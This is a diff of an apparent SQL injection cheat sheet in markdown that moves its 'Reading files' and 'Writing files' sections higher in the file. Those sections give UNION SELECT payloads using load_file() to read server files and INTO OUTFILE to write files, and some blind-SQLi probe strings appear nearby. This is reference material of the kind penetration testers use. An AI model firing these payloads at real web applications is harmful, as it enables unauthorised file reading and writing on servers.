@@ -1,5 +1,11 @@
 SQLi or SQL injection is a web application vulnerability allows an attacker to bypass logins and extract sensitive data from the database.
 
+#### Reading files:
+UniOn selEct 1,load_file('file location') /*
+
+#### Writing files:
+UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
+
 ## Blind SQLi
 Another type of sql injection attack where error does not shown to the user.
 ### How to indentify blind SQLi:
@@ -45,8 +51,3 @@ Ps: sometimes you might need to add ';' before the comment, examples:
 anD 1=1//
 anD 1=1;//
 ```
-#### Reading files:
-UniOn selEct 1,load_file('file location') /*
-
-#### Writing files:
-UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
